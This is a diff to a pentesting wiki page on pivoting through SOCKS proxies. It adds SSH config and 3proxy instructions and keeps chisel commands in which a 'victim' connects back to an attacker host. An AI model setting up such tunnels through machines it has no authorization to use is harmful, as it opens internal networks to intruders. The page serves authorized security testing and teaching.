@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo
+authors: ShutdownRepo, Macbucheron1
 category: infra
 ---
 
@@ -29,8 +29,10 @@ In practice, there are many ways to turn a controlled machine into a SOCKS proxy
 
 ::: tabs
 
-=== SSH commands
+=== SSH
 
+**SSH commands**
+ 
 One of the most easy is by relying on SSH, however, it requires to have an SSH server running on the controlled machine and a valid account. The tester needs to open an SSH connection to the machine that should be turned into a SOCKS proxy, and supply the `-D` option along with the port to use for tunneling. The command can also be used with `-N` option to make sure no command gets executed after the SSH session is opened.
 
 ```bash
@@ -44,7 +46,22 @@ A reverse dynamic port forwarding can be also put in place to tunnel a machine's
 ```bash
 ssh -N -R $PORT $CONTROLLED_TARGET
 ```
+**SSH config**
 
+The same operations can be conducted through a pre-configured agent defined in `~/.ssh/config` instead of using command-line argument.
+```
+Host pivot
+    HostName $CONTROLLED_TARGET
+    User $CONTROLLED_USER
+    DynamicForward $PORT    # For dynamic port forward
+    # RemoteForward $PORT   # For reverse dynamic port forward
+    ExitOnForwardFailure yes
+    RequestTTY no
+```
+This setup can then be initiated with the following command:
+```bash
+ssh -N pivot  
+```
 
 === Chisel
 
@@ -59,12 +76,6 @@ chisel server --reverse --socks5 -p $PORT
 # victim
 chisel client $ATTACKER_MACHINE_IP:$ATTACKER_MACHINE_PORT R:socks
 ```
-
-
-=== SSH config
-
-
-
 
 === Metasploit
 
@@ -85,13 +96,33 @@ msf > set VERSION 4a
 msf > run
 ```
 
-=== Cobalt Strike
-
-=== proxychains
+=== 🛠️ Cobalt Strike
+TO DO
 
 === 3proxy
 
-=== plink
+[3proxy](https://github.com/3proxy/3proxy) is a proxy server that can expose a SOCKS proxy.
+It can be used to expose a SOCKS proxy on a given interface and port, which can then be port forwarded to the attacker's machine.
+
+A minimal configuration can be saved in a `3proxy.cfg` file:
+
+```
+daemon
+auth none
+allow *
+socks -p$PORT -i127.0.0.1
+```
+
+The proxy server can then be launched with:
+
+```bash
+3proxy /path/to/3proxy.cfg
+```
+
+Port `$PORT` can then be [forwarded](port-forwarding.md) to access the proxy from the attacker's machine. 
+
+=== 🛠️ plink
+TO DO
 
 :::
 
@@ -116,6 +147,13 @@ In certain scenarios, SOCKS proxies can be chained. This can easily be used with
 
 ![](<./assets/Chained dynamic port forwarding commands SSH.png>)
 Setting up the SOCKS proxy servers (with SSH){.caption}
+
+> [!WARNING] 
+> Binding a SOCKS proxy to `0.0.0.0` exposes the listener to every host on the network, which allows any actor with network access to reuse the tunnel. Exposure can be reduce by keeping the SOCKS service local to the distant pivot and [forwarding](port-forwarding.md) it through the initial pivot. That way the proxy is never directly reachable from the network.
+
+> [!TIP]
+> When jumping through an intermediate pivot, `ssh -J someuser@pivot1 someuser@pivot2` combined with `ssh -N -D $PORT` keeps only a single SOCKS proxy running on the attacker machine.
+> `ssh -J` (ProxyJump) automate the process of chaining SOCKS proxy.
 
 ![](<./assets/Chained dynamic port forwarding commands proxychains.png>)
 Setting up the SOCKS proxy client (proxychains){.caption}
